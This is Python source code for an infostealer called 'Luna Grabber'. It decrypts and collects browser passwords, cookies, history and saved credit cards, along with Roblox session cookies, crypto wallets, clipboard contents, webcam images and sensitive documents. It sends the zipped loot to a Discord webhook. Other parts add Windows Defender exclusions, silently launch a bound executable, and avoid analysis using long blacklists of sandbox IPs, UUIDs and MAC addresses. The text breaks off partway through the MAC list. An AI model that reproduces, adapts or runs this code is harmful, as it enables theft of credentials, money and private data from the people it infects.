__CONFIG__ = {'webhook': 
, 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TuvZSp6rrzY4DERm', 'wallets': True}

import concurrent.futures
import ctypes
import json
import os
import random
import requests
import subprocess
import sys
import zlib
from multiprocessing import cpu_count
from requests_toolbelt.multipart.encoder import MultipartEncoder
from zipfile import ZIP_DEFLATED, ZipFile
import psutil

#global variables
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
if not hasattr(sys, "_MEIPASS"):
	sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


def main(webhook: str):
	threads = []

	if __CONFIG__["fakeerror"]:
		threads.append(Fakeerror)
	if __CONFIG__["startup"]:
		threads.append(Startup)
	if __CONFIG__["defender"]:
		threads.append(Defender)
	if __CONFIG__["browser"]:
		threads.append(Browsers)
	if __CONFIG__["wifi"]:
		threads.append(Wifi)
	if __CONFIG__["common_files"]:
		threads.append(CommonFiles)
	if __CONFIG__["clipboard"]:
		threads.append(Clipboard)
	if __CONFIG__["webcam"]:
		threads.append(capture_images)
	if __CONFIG__["wallets"]:
		threads.append(steal_wallets)
	if __CONFIG__["games"]:
		threads.append(Games)

	if __CONFIG__["browser"] or __CONFIG__["roblox"]:
		browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
			"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
		browsers_found = []
		for proc in psutil.process_iter(['name']):
			process_name = proc.info['name'].lower()
			if process_name in browser_exe:
				browsers_found.append(proc)

		for proc in browsers_found:
			try:
				proc.kill()
			except Exception:
				pass

	with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
		executor.map(lambda func: func(), threads)

	max_archive_size = 1024 * 1024 * 25
	current_archive_size = 0

	_zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
	with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
		for dirname, _, files in os.walk(temp_path):
			for filename in files:
				absname = os.path.join(dirname, filename)
				arcname = os.path.relpath(absname, temp_path)
				file_size = os.path.getsize(absname)
				if current_archive_size + file_size <= max_archive_size:
					zipped_file.write(absname, arcname)
					current_archive_size += file_size
				else:
					break

	data = {
		"username": "Luna",
		"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
	}

	_file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'

	if __CONFIG__["ping"]:
		if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
			content = f"@{__CONFIG__['pingtype'].lower()}"
			data.update({"content": content})

	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
		if os.path.getsize(_file) == 22:
			return
		with open(_file, 'rb') as file:
			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
			requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
	else:
		requests.post(webhook, json=data)

	if __CONFIG__["systeminfo"]:
		PcInfo()

	if __CONFIG__["discord"]:
		Discord()

	if __CONFIG__["roblox"]:
		Roblox()

	if __CONFIG__["screenshot"]:
		Screenshot()

	os.remove(_file)

def Luna(webhook: str):
	def GetSelf() -> tuple[str, bool]:
		if hasattr(sys, "frozen"):
			return (sys.argv[0], True)
		else:
			return (__file__, False)    

	def ExcludeFromDefender(path) -> None:
		if __CONFIG__["defender"]:
			subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
		
	def IsConnectedToInternet() -> bool:
		try:
			return requests.get("https://gstatic.com/generate_204").status_code == 204
		except Exception:
			return False
		
	if not IsConnectedToInternet():
		if not __CONFIG__["startup"]:
			os._exit(0)

	def CreateMutex(mutex: str) -> bool:
		kernel32 = ctypes.windll.kernel32
		mutex = kernel32.CreateMutexA(None, False, mutex)
		return kernel32.GetLastError() != 183
	
	if not CreateMutex(__CONFIG__["mutex"]):
		os._exit(0)
		

	path, isExecutable = GetSelf()
	inStartup = os.path.basename(os.path.dirname(path)).lower() == "startup"
	if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.luna")):
		if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")):
			os.remove(boundFileDst)
		with open(boundFileSrc, "rb") as f:
			content = f.read()
		decrypted = zlib.decompress(content[::-1])
		with open(boundFileDst, "wb") as f:
			f.write(decrypted)
		del content, decrypted
				  
		ExcludeFromDefender(boundFileDst)
		subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
		

	if __CONFIG__["anti_spam"]:
		AntiSpam()

	if __CONFIG__["antidebug_vm"]:
		Debug()

	with concurrent.futures.ThreadPoolExecutor() as executor:
		if __CONFIG__["injection"]:
			executor.submit(Injection, webhook)
		executor.submit(main, webhook)

	if __CONFIG__["self_destruct"]:
		SelfDestruct()



# Options get put here
import time

class AntiSpam:
	def __init__(self):
		if self.check_time():
			os._exit(0)

	def check_time(self) -> bool:
		current_time = time.time()
		file_path = os.path.join(temp, "dd_setup.txt")
		try:
			if os.path.exists(file_path):
				file_modified_time = os.path.getmtime(file_path)
				if current_time - file_modified_time > 60:
					os.utime(file_path, (current_time, current_time))
					return False
				else:
					return True
			else:
				with open(file_path, "w") as f:
					f.write(str(current_time))
				return False
		except Exception:
			return False

import shutil
import winreg

class CommonFiles:
    def __init__(self):
        self.zipfile = os.path.join(temp_path, f'Common-Files-{os.getlogin()}.zip')
        self.steal_common_files()
        

    def steal_common_files(self) -> None:
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None
            
        paths = [_get_user_folder_path("Desktop"), _get_user_folder_path("Personal"), _get_user_folder_path("{374DE290-123F-4565-9164-39C4925E467B}")]
        
        for search_path in paths:
            if os.path.isdir(search_path):
                entry: str
                for entry in os.listdir(search_path):
                    if os.path.isfile(os.path.join(search_path, entry)):
                        if (any([x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                            or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                            and not entry.endswith(".lnk") \
                            and 0 < os.path.getsize(os.path.join(search_path, entry)) < 2 * 1024 * 1024: # File less than 2 MB
                            try:
                                os.makedirs(os.path.join(temp_path, "Common Files"), exist_ok=True)
                                shutil.copy(os.path.join(search_path, entry), os.path.join(temp_path, "Common Files", entry))
                            except Exception:
                                pass
                    elif os.path.isdir(os.path.join(search_path, entry)) and not entry == "Common Files":
                        for sub_entry in os.listdir(os.path.join(search_path, entry)):
                            if os.path.isfile(os.path.join(search_path, entry, sub_entry)):
                                if (any([x in sub_entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                    or sub_entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                                    and not entry.endswith(".lnk") \
                                    and 0 < os.path.getsize(os.path.join(search_path, entry, sub_entry)) < 2 * 1024 * 1024: # File less than 2 MB
                                    try:
                                        os.makedirs(os.path.join(temp_path, "Common Files", entry), exist_ok=True)
                                        shutil.copy(os.path.join(search_path, entry, sub_entry), os.path.join(temp_path, "Common Files", entry))
                                    except Exception:
                                        pass


import base64
import sqlite3
import threading
from Cryptodome.Cipher import AES
from typing import Union
from win32crypt import CryptUnprotectData

class Browsers:
	def __init__(self):
		self.appdata = os.getenv('LOCALAPPDATA')
		self.roaming = os.getenv('APPDATA')
		self.browsers = {
			'kometa': self.appdata + '\\Kometa\\User Data',
			'orbitum': self.appdata + '\\Orbitum\\User Data',
			'cent-browser': self.appdata + '\\CentBrowser\\User Data',
			'7star': self.appdata + '\\7Star\\7Star\\User Data',
			'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
			'vivaldi': self.appdata + '\\Vivaldi\\User Data',
			'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
			'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
			'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
			'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
			'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
			'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
			'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
			'iridium': self.appdata + '\\Iridium\\User Data',
			'opera': self.roaming + '\\Opera Software\\Opera Stable',
			'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
		}

		self.profiles = [
			'Default',
			'Profile 1',
			'Profile 2',
			'Profile 3',
			'Profile 4',
			'Profile 5',
		]

		os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

		def process_browser(name, path, profile, func):
			try:
				func(name, path, profile)
			except Exception:
				pass

		threads = []
		for name, path in self.browsers.items():
			if not os.path.isdir(path):
				continue

			self.masterkey = self.get_master_key(path + '\\Local State')
			self.funcs = [
				self.cookies,
				self.history,
				self.passwords,
				self.credit_cards
			]

			for profile in self.profiles:
				for func in self.funcs:
					thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
					thread.start()
					threads.append(thread)

		for thread in threads:
			thread.join()

		self.roblox_cookies()
		self.robloxinfo(__CONFIG__["webhook"])

	def get_master_key(self, path: str) -> str:
		try:
			with open(path, "r", encoding="utf-8") as f:
				c = f.read()
			local_state = json.loads(c)
			master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
			master_key = master_key[5:]
			master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
			return master_key
		except Exception:
			pass

	def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	def passwords(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Login Data'
		else:
			path += '\\' + profile + '\\Login Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
		password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
		for results in cursor.fetchall():
			if not results[0] or not results[1] or not results[2]:
				continue
			url = results[0]
			login = results[1]
			password = self.decrypt_password(results[2], self.masterkey)
			with open(password_file_path, "a", encoding="utf-8") as f:
				if os.path.getsize(password_file_path) == 0:
					f.write("Website  |  Username  |  Password\n\n")
				f.write(f"{url}  |  {login}  |  {password}\n")
		cursor.close()
		conn.close()

	def cookies(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Network\\Cookies'
		else:
			path += '\\' + profile + '\\Network\\Cookies'
		if not os.path.isfile(path):
			return
		cookievault = create_temp()
		shutil.copy2(path, cookievault)
		conn = sqlite3.connect(cookievault)
		cursor = conn.cursor()
		with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
			f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
			for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
				host_key, name, path, encrypted_value, expires_utc = res
				value = self.decrypt_password(encrypted_value, self.masterkey)
				if host_key and name and value != "":
					f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
		cursor.close()
		conn.close()
		os.remove(cookievault)

	def history(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\History'
		else:
			path += '\\' + profile + '\\History'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		history_file_path = os.path.join(temp_path, "Browser", "history.txt")
		with open(history_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(history_file_path) == 0:
				f.write("Url  |  Visit Count\n\n")
			for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
				url, visit_count = res
				f.write(f"{url}  |  {visit_count}\n")
		cursor.close()
		conn.close()

	def credit_cards(self, name: str, path: str, profile: str):
		if name in ['opera', 'opera-gx']:
			path += '\\Web Data'
		else:
			path += '\\' + profile + '\\Web Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
		with open(cc_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(cc_file_path) == 0:
				f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
			for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
				name_on_card, expiration_month, expiration_year, card_number_encrypted = res
				card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
				f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
		cursor.close()
		conn.close()

def create_temp(_dir: Union[str, os.PathLike] = None):
	if _dir is None:
		_dir = os.path.expanduser("~/tmp")
	if not os.path.exists(_dir):
		os.makedirs(_dir)
	file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
	path = os.path.join(_dir, file_name)
	open(path, "x").close()
	return path

import browser_cookie3

class Roblox:
	def __init__(self):
		self.roblox_cookies = {}
		self.grab_roblox_cookies()
		self.send_info()

	def grab_roblox_cookies(self):
		browsers = [
			('Chrome', browser_cookie3.chrome),
			('Edge', browser_cookie3.edge),
			('Firefox', browser_cookie3.firefox),
			('Safari', browser_cookie3.safari),
			('Opera', browser_cookie3.opera),
			('Brave', browser_cookie3.brave),
			('Vivaldi', browser_cookie3.vivaldi)
		]
		for browser_name, browser in browsers:
			try:
				browser_cookies = browser(domain_name='roblox.com')
				for cookie in browser_cookies:
					if cookie.name == '.ROBLOSECURITY':
						self.roblox_cookies[browser_name] = cookie.value
			except Exception:
				pass
			
	def send_info(self):
		for roblox_cookie in self.roblox_cookies.values():
			headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
			info = None
			try:
				response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
				response.raise_for_status()
				info = response.json()
			except Exception:
				pass

			first_cookie_half = roblox_cookie[:len(roblox_cookie)//2]
			second_cookie_half = roblox_cookie[len(roblox_cookie)//2:]

			if info is not None:
				data = {
					"embeds": [
						{
							"title": "Roblox Info",
							"color": 5639644,
							"fields": [
								{
									"name": "Name:",
									"value": f"`{info['UserName']}`",
									"inline": True
								},
								{
									"name": "<:robux_coin:1041813572407283842> Robux:",
									"value": f"`{info['RobuxBalance']}`",
									"inline": True
								},
								{
									"name": ":cookie: Cookie:",
									"value": f"`{first_cookie_half}`",
									"inline": False
								},
								{	
									"name": "",
									"value": f"`{second_cookie_half}`",
									"inline": False
									
								},
							],
							"thumbnail": {
								"url": info['ThumbnailUrl']
							},
							"footer": {
								"text": "Luna Grabber | Created By Smug"
							},
						}
					],
					"username": "Luna",
					"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
				}
				requests.post(__CONFIG__['webhook'], json=data)

import pyperclip

class Clipboard:
	def __init__(self):
		self.directory = os.path.join(temp_path, "Clipboard")
		os.makedirs(self.directory, exist_ok=True)
		self.get_clipboard()

	def get_clipboard(self):
		content = pyperclip.paste()
		if content:
			with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
				file.write(content)
		else:
			with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
				file.write("Clipboard is empty")


class Debug:
	def __init__(self):
		self.blacklisted_users = {
			'wdagutilityaccount', 'abby', 'hmarc', 'patex', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a',
			'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'fred', 'server', 'bvjchrpnsxn', 'harry johnson', 'sqgfof3g', 'lucas', 'mike', 'patex', 'h7dk1xpr', 'louise',
			'user01', 'test', 'rgzcbuyrznreg', 'bruno', 'george', 'administrator'
		}
		self.blacklisted_pc_names = {
			'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1',
			'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez',
			'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'nettypc', 'desktop-bugio', 'desktop-cbgpfee', 'server-pc', 'tiqiyla9tw5m',
			'desktop-kalvino', 'compname_4047', 'desktop-19olltd', 'desktop-de369se', 'ea8c2e2a-d017-4', 'aidanpc', 'lucas-pc', 'marci-pc', 'acepc', 'mike-pc', 'desktop-iapkn1p',
			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42', 'desktop-et51ajo', 'DESKTOP-ET51AJO'
		}
		self.blacklisted_uuids = {
			'7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
			'6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
			'00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
			'49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
			'49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
			'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
			'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
			'6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
			'8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
			'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8',
			'49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250',
			'63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E',
			'00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
			'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026',
			'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85',
			'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
			'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
			'38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009',
			'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
			'88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
			'0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
			'8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE',
			'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
			'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C',
			'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
			'9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2',
			'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5',
			'60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
			'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
			'84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
			'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
			'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
			'921E2042-70D3-F9F1-8CBD-B398A21F89C6', '8CE01CC0-882F-4658-9A78-B9AA408651DF', '00000000-0000-0000-0000-000000000000'}
		self.blacklisted_ips = {
			'88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
			'34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
			'195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
			'109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
			'34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
			'34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
			'193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107', '35.186.63.112'}
		self.blacklisted_macs = {
			'00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
			'00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
			'42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
			'42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3',
			'00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1',
			'00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de',
			'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02',
			'42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3',
			'96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
			'3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d',
			'00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e',
			'00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8',
			'3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20',
			'3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7',
			'94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de',
			'7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
			'00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
